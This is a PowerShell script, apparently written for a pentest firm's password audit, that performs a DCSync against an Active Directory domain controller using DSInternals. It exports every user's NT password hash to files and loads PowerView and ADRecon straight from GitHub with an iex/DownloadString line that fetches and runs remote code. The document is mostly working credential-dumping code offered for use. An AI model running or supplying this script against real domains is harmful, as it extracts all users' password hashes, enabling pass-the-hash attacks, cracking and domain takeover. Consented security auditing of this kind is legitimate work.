# Author: LRVT - https://github.com/l4rm4nd/
# Modified to use DSInternals instead of Mimikatz

# variables
$DATE = $(get-date -f yyyyMMddThhmm)
$PATH = "C:\temp\" + $DATE + "_" + "DCSYNC" + "\"
$EXT = ".txt"
$LOGFILE = $PATH + $DATE + "_" + "DCSync_NTLM_LOGFILE" + $EXT
$HASHES = $PATH + $DATE + "_" + "DCSync_NTLM_Hashes_FINAL" + $EXT
$USERS = $PATH + $DATE + "_" + "DCSync_NTLM_Users_FINAL" + $EXT
$PTFHASHES = $PATH + $DATE + "_" + "DCSync_NTLM_PTF_Hashes_FINAL" + $EXT
$IMPORTFILE = $PATH + $DATE + "_" + "DCSync_NTLM_CUSTOMER_Importfile_FINAL" + $EXT
$POLICY = $PATH + $DATE + "_" + "Domain_Password_Policy" + $EXT

# helper function to convert user account control values
Function DecodeUserAccountControl ([int]$UAC)
{
$UACPropertyFlags = @(
"SCRIPT",
"ACCOUNTDISABLE",
"RESERVED",
"HOMEDIR_REQUIRED",
"LOCKOUT",
"PASSWD_NOTREQD",
"PASSWD_CANT_CHANGE",
"ENCRYPTED_TEXT_PWD_ALLOWED",
"TEMP_DUPLICATE_ACCOUNT",
"NORMAL_ACCOUNT",
"RESERVED",
"INTERDOMAIN_TRUST_ACCOUNT",
"WORKSTATION_TRUST_ACCOUNT",
"SERVER_TRUST_ACCOUNT",
"RESERVED",
"RESERVED",
"DONT_EXPIRE_PASSWORD",
"MNS_LOGON_ACCOUNT",
"SMARTCARD_REQUIRED",
"TRUSTED_FOR_DELEGATION",
"NOT_DELEGATED",
"USE_DES_KEY_ONLY",
"DONT_REQ_PREAUTH",
"PASSWORD_EXPIRED",
"TRUSTED_TO_AUTH_FOR_DELEGATION",
"RESERVED",
"PARTIAL_SECRETS_ACCOUNT"
"RESERVED"
"RESERVED"
"RESERVED"
"RESERVED"
"RESERVED"
)
return (0..($UACPropertyFlags.Length) | ?{$UAC -bAnd [math]::Pow(2,$_)} | %{$UACPropertyFlags[$_]}) -join ";"
}

# Check if DSInternals module is available
Write-Host "[INFO] Checking for DSInternals module" -ForegroundColor Gray
if (-not (Get-Module -ListAvailable -Name DSInternals)) {
    Write-Host "[ERROR] DSInternals module not found. Please install it first:" -ForegroundColor Red
    Write-Host "  Install-Module -Name DSInternals -Force" -ForegroundColor Yellow
    exit
}
Import-Module DSInternals

# download powerview into memory
Write-Host "[INFO] Downloading PowerView into Memory" -ForegroundColor Gray
iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pentestfactory/PowerSploit/dev/Recon/PowerView.ps1')

# download adrecon into memory
Write-Host "[INFO] Downloading ADRecon into Memory" -ForegroundColor Gray
iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pentestfactory/ADRecon/master/ADRecon.ps1')

# print out domain context
$domain = get-netdomain | Select-Object -property Name | foreach { $_.Name}
$dcServer = (Get-NetDomainController).Name
Write-Host "[INFO] DCSync will be executed for the domain: $domain" -ForegroundColor Red
Write-Host "[INFO] Using Domain Controller: $dcServer" -ForegroundColor Gray

$confirmation = Read-Host "Is the domain correct to execute DCSync on? (y/n)"
if ($confirmation -eq 'y') {

    # create directory for storage
    Write-Host ""
    Write-Host "[~] Creating new directory at $PATH" -ForegroundColor Gray
    Write-Host ""
    New-Item -ItemType Directory -Force -Path $PATH | Out-Null
    
    # execute DCSync to export NT-Hashes using DSInternals
    Write-Host "[!] Exporting NT-Hashes via DCSync (DSInternals) - this may take a while..." -ForegroundColor Yellow
    
    # Get all accounts using DSInternals
    $accounts = Get-ADReplAccount -All -Server $dcServer -NamingContext "dc=$($domain.Replace('.',',dc='))"
    
    # Filter out computer accounts and create logfile in mimikatz-like format
    Write-Host "[~] Processing accounts and creating logfile" -ForegroundColor Gray
    $userAccounts = $accounts | Where-Object { 
        $_.SamAccountType -eq 'User' -and 
        $_.SamAccountName -notlike '*$' -and
        $_.NTHash -ne $null
    }
    
    # Create logfile with tab-separated format: ID, SamAccountName, NTHash, UserAccountControl
    $logContent = @()
    $id = 0
    foreach ($account in $userAccounts) {
        # DSInternals returns UAC as text, use it directly (already decoded)
        $uacText = $account.UserAccountControl -join ", "
        if ([string]::IsNullOrEmpty($uacText)) {
            $uacText = "NormalAccount"
        }
        # Convert NT hash byte array to hex string
        $ntHashHex = ($account.NTHash | ForEach-Object { $_.ToString("x2") }) -join ""
        $line = "$id`t$($account.SamAccountName)`t$ntHashHex`t$uacText"
        $logContent += $line
        $id++
    }
    $logContent | Out-File -FilePath $LOGFILE -Encoding UTF8

    # using ADRecon to extract user details
    Write-Host "[!] Extracting user details via LDAP" -ForegroundColor Yellow
    Invoke-ADRecon -method LDAP -Collect Users -OutputType CSV -ADROutputDir $PATH | Out-Null

    # create temporary NTLM only and users only files
    $logContent | ForEach-Object {$_.Split("`t")[2]} | Out-File -FilePath $HASHES -Encoding UTF8
    $logContent | ForEach-Object {$_.Split("`t")[1]} | Out-File -FilePath $USERS -Encoding UTF8

    # create hashfile for pentest factory
    Write-Host ""
    Write-Host "[~] Create file with hashes only" -ForegroundColor Gray
    $csv_obj = Import-csv -Delimiter "`t" -Path $LOGFILE -header ID,SAMACCOUNTNAME,HASH,TYPE
    # DSInternals already provides decoded UAC values as text, no need to decode
    $csv_obj | select -Property hash,type | ConvertTo-Csv -NoTypeInformation | Select-Object -skip 1 | Out-File -FilePath $PTFHASHES -Encoding UTF8

    # create import file for customer
    Write-Host "[~] Create import file with samaccountnames and hashes" -ForegroundColor Gray
    $File1 = Get-Content $USERS
    $File2 = Get-Content $HASHES
    for($i = 0; $i -lt $File1.Count; $i++)
    {
        ("{0},{1}" -f $File1[$i],$File2[$i]) | Add-Content $IMPORTFILE
    }

    # using PowerView to extract default domain password policy
    (Get-DomainPolicy).SystemAccess | Out-File -FilePath $POLICY -Encoding UTF8
    
    # sort files into dirs
    New-Item -Path $PATH\PTF -ItemType Directory | Out-Null
    New-Item -Path $PATH\CUSTOMER -ItemType Directory | Out-Null
    Move-Item -Path $PATH\CSV-Files\Users.csv -Destination $PATH\PTF\.
    Move-Item -Path $PTFHASHES -Destination $PATH\PTF\.
    Move-Item -Path $POLICY -Destination $PATH\PTF\.
    Move-Item -Path $IMPORTFILE -Destination $PATH\CUSTOMER\.
    Move-Item -Path $LOGFILE -Destination $PATH\CUSTOMER\.
   
    # cleanup
    Remove-Item -Path $USERS
    Remove-Item -Path $HASHES
    Remove-Item -Path $PATH\CSV-Files\ -recurse

    # final message
    Write-Host ""
    Write-Host "[OK] Extraction completed for $($csv_obj.length) user accounts" -ForegroundColor Green
    Write-Host "  > Please submit the PTF directory to Pentest Factory GmbH" -ForegroundColor Gray
    Write-Host "  > Please consider all files as confidential!" -ForegroundColor Gray
    Write-Host ""
    explorer $PATH

}else{
    Write-Host "[!] Script aborted due to wrong domain. Please hardcode the domain in the PS1 script if needed." -ForegroundColor Red
}
